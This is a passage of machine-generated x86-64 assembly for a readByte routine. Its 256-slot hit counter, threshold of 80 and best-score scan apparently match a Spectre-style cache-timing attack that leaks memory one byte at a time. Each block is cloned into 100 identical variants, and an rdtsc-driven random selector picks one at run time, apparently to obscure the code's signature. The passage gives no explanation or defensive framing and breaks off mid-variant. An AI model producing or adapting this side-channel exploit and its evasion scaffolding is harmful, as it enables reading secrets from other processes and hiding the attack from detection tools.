	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 72
.LreadByte_win3_var72:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 73
.LreadByte_win3_var73:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 74
.LreadByte_win3_var74:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 75
.LreadByte_win3_var75:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 76
.LreadByte_win3_var76:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 77
.LreadByte_win3_var77:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 78
.LreadByte_win3_var78:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 79
.LreadByte_win3_var79:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 80
.LreadByte_win3_var80:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 81
.LreadByte_win3_var81:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 82
.LreadByte_win3_var82:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 83
.LreadByte_win3_var83:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 84
.LreadByte_win3_var84:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 85
.LreadByte_win3_var85:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 86
.LreadByte_win3_var86:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 87
.LreadByte_win3_var87:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 88
.LreadByte_win3_var88:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 89
.LreadByte_win3_var89:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 90
.LreadByte_win3_var90:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 91
.LreadByte_win3_var91:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 92
.LreadByte_win3_var92:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 93
.LreadByte_win3_var93:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 94
.LreadByte_win3_var94:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 95
.LreadByte_win3_var95:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 96
.LreadByte_win3_var96:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 97
.LreadByte_win3_var97:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 98
.LreadByte_win3_var98:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
## Variant 99
.LreadByte_win3_var99:
	popq	%rax
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	jmp	.LreadByte_win3_continue
.LreadByte_win3_continue:
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win2_var0
	cmpl	$1, %eax
	je	.LreadByte_win2_var1
	cmpl	$2, %eax
	je	.LreadByte_win2_var2
	cmpl	$3, %eax
	je	.LreadByte_win2_var3
	cmpl	$4, %eax
	je	.LreadByte_win2_var4
	cmpl	$5, %eax
	je	.LreadByte_win2_var5
	cmpl	$6, %eax
	je	.LreadByte_win2_var6
	cmpl	$7, %eax
	je	.LreadByte_win2_var7
	cmpl	$8, %eax
	je	.LreadByte_win2_var8
	cmpl	$9, %eax
	je	.LreadByte_win2_var9
	cmpl	$10, %eax
	je	.LreadByte_win2_var10
	cmpl	$11, %eax
	je	.LreadByte_win2_var11
	cmpl	$12, %eax
	je	.LreadByte_win2_var12
	cmpl	$13, %eax
	je	.LreadByte_win2_var13
	cmpl	$14, %eax
	je	.LreadByte_win2_var14
	cmpl	$15, %eax
	je	.LreadByte_win2_var15
	cmpl	$16, %eax
	je	.LreadByte_win2_var16
	cmpl	$17, %eax
	je	.LreadByte_win2_var17
	cmpl	$18, %eax
	je	.LreadByte_win2_var18
	cmpl	$19, %eax
	je	.LreadByte_win2_var19
	cmpl	$20, %eax
	je	.LreadByte_win2_var20
	cmpl	$21, %eax
	je	.LreadByte_win2_var21
	cmpl	$22, %eax
	je	.LreadByte_win2_var22
	cmpl	$23, %eax
	je	.LreadByte_win2_var23
	cmpl	$24, %eax
	je	.LreadByte_win2_var24
	cmpl	$25, %eax
	je	.LreadByte_win2_var25
	cmpl	$26, %eax
	je	.LreadByte_win2_var26
	cmpl	$27, %eax
	je	.LreadByte_win2_var27
	cmpl	$28, %eax
	je	.LreadByte_win2_var28
	cmpl	$29, %eax
	je	.LreadByte_win2_var29
	cmpl	$30, %eax
	je	.LreadByte_win2_var30
	cmpl	$31, %eax
	je	.LreadByte_win2_var31
	cmpl	$32, %eax
	je	.LreadByte_win2_var32
	cmpl	$33, %eax
	je	.LreadByte_win2_var33
	cmpl	$34, %eax
	je	.LreadByte_win2_var34
	cmpl	$35, %eax
	je	.LreadByte_win2_var35
	cmpl	$36, %eax
	je	.LreadByte_win2_var36
	cmpl	$37, %eax
	je	.LreadByte_win2_var37
	cmpl	$38, %eax
	je	.LreadByte_win2_var38
	cmpl	$39, %eax
	je	.LreadByte_win2_var39
	cmpl	$40, %eax
	je	.LreadByte_win2_var40
	cmpl	$41, %eax
	je	.LreadByte_win2_var41
	cmpl	$42, %eax
	je	.LreadByte_win2_var42
	cmpl	$43, %eax
	je	.LreadByte_win2_var43
	cmpl	$44, %eax
	je	.LreadByte_win2_var44
	cmpl	$45, %eax
	je	.LreadByte_win2_var45
	cmpl	$46, %eax
	je	.LreadByte_win2_var46
	cmpl	$47, %eax
	je	.LreadByte_win2_var47
	cmpl	$48, %eax
	je	.LreadByte_win2_var48
	cmpl	$49, %eax
	je	.LreadByte_win2_var49
	cmpl	$50, %eax
	je	.LreadByte_win2_var50
	cmpl	$51, %eax
	je	.LreadByte_win2_var51
	cmpl	$52, %eax
	je	.LreadByte_win2_var52
	cmpl	$53, %eax
	je	.LreadByte_win2_var53
	cmpl	$54, %eax
	je	.LreadByte_win2_var54
	cmpl	$55, %eax
	je	.LreadByte_win2_var55
	cmpl	$56, %eax
	je	.LreadByte_win2_var56
	cmpl	$57, %eax
	je	.LreadByte_win2_var57
	cmpl	$58, %eax
	je	.LreadByte_win2_var58
	cmpl	$59, %eax
	je	.LreadByte_win2_var59
	cmpl	$60, %eax
	je	.LreadByte_win2_var60
	cmpl	$61, %eax
	je	.LreadByte_win2_var61
	cmpl	$62, %eax
	je	.LreadByte_win2_var62
	cmpl	$63, %eax
	je	.LreadByte_win2_var63
	cmpl	$64, %eax
	je	.LreadByte_win2_var64
	cmpl	$65, %eax
	je	.LreadByte_win2_var65
	cmpl	$66, %eax
	je	.LreadByte_win2_var66
	cmpl	$67, %eax
	je	.LreadByte_win2_var67
	cmpl	$68, %eax
	je	.LreadByte_win2_var68
	cmpl	$69, %eax
	je	.LreadByte_win2_var69
	cmpl	$70, %eax
	je	.LreadByte_win2_var70
	cmpl	$71, %eax
	je	.LreadByte_win2_var71
	cmpl	$72, %eax
	je	.LreadByte_win2_var72
	cmpl	$73, %eax
	je	.LreadByte_win2_var73
	cmpl	$74, %eax
	je	.LreadByte_win2_var74
	cmpl	$75, %eax
	je	.LreadByte_win2_var75
	cmpl	$76, %eax
	je	.LreadByte_win2_var76
	cmpl	$77, %eax
	je	.LreadByte_win2_var77
	cmpl	$78, %eax
	je	.LreadByte_win2_var78
	cmpl	$79, %eax
	je	.LreadByte_win2_var79
	cmpl	$80, %eax
	je	.LreadByte_win2_var80
	cmpl	$81, %eax
	je	.LreadByte_win2_var81
	cmpl	$82, %eax
	je	.LreadByte_win2_var82
	cmpl	$83, %eax
	je	.LreadByte_win2_var83
	cmpl	$84, %eax
	je	.LreadByte_win2_var84
	cmpl	$85, %eax
	je	.LreadByte_win2_var85
	cmpl	$86, %eax
	je	.LreadByte_win2_var86
	cmpl	$87, %eax
	je	.LreadByte_win2_var87
	cmpl	$88, %eax
	je	.LreadByte_win2_var88
	cmpl	$89, %eax
	je	.LreadByte_win2_var89
	cmpl	$90, %eax
	je	.LreadByte_win2_var90
	cmpl	$91, %eax
	je	.LreadByte_win2_var91
	cmpl	$92, %eax
	je	.LreadByte_win2_var92
	cmpl	$93, %eax
	je	.LreadByte_win2_var93
	cmpl	$94, %eax
	je	.LreadByte_win2_var94
	cmpl	$95, %eax
	je	.LreadByte_win2_var95
	cmpl	$96, %eax
	je	.LreadByte_win2_var96
	cmpl	$97, %eax
	je	.LreadByte_win2_var97
	cmpl	$98, %eax
	je	.LreadByte_win2_var98
	cmpl	$99, %eax
	je	.LreadByte_win2_var99
	jmp	.LreadByte_win2_var0
## Variant 0
.LreadByte_win2_var0:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 1
.LreadByte_win2_var1:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 2
.LreadByte_win2_var2:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 3
.LreadByte_win2_var3:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 4
.LreadByte_win2_var4:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 5
.LreadByte_win2_var5:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 6
.LreadByte_win2_var6:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 7
.LreadByte_win2_var7:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 8
.LreadByte_win2_var8:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 9
.LreadByte_win2_var9:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 10
.LreadByte_win2_var10:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 11
.LreadByte_win2_var11:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 12
.LreadByte_win2_var12:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 13
.LreadByte_win2_var13:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 14
.LreadByte_win2_var14:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 15
.LreadByte_win2_var15:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 16
.LreadByte_win2_var16:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 17
.LreadByte_win2_var17:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 18
.LreadByte_win2_var18:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 19
.LreadByte_win2_var19:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 20
.LreadByte_win2_var20:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 21
.LreadByte_win2_var21:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 22
.LreadByte_win2_var22:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 23
.LreadByte_win2_var23:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 24
.LreadByte_win2_var24:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 25
.LreadByte_win2_var25:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 26
.LreadByte_win2_var26:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 27
.LreadByte_win2_var27:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 28
.LreadByte_win2_var28:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 29
.LreadByte_win2_var29:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 30
.LreadByte_win2_var30:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 31
.LreadByte_win2_var31:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 32
.LreadByte_win2_var32:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 33
.LreadByte_win2_var33:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 34
.LreadByte_win2_var34:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 35
.LreadByte_win2_var35:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 36
.LreadByte_win2_var36:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 37
.LreadByte_win2_var37:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 38
.LreadByte_win2_var38:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 39
.LreadByte_win2_var39:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 40
.LreadByte_win2_var40:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 41
.LreadByte_win2_var41:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 42
.LreadByte_win2_var42:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 43
.LreadByte_win2_var43:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 44
.LreadByte_win2_var44:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 45
.LreadByte_win2_var45:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 46
.LreadByte_win2_var46:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 47
.LreadByte_win2_var47:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 48
.LreadByte_win2_var48:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 49
.LreadByte_win2_var49:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 50
.LreadByte_win2_var50:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 51
.LreadByte_win2_var51:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 52
.LreadByte_win2_var52:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jmp	.LreadByte_win2_continue
## Variant 53
.LreadByte_win2_var53:
	popq	%rax
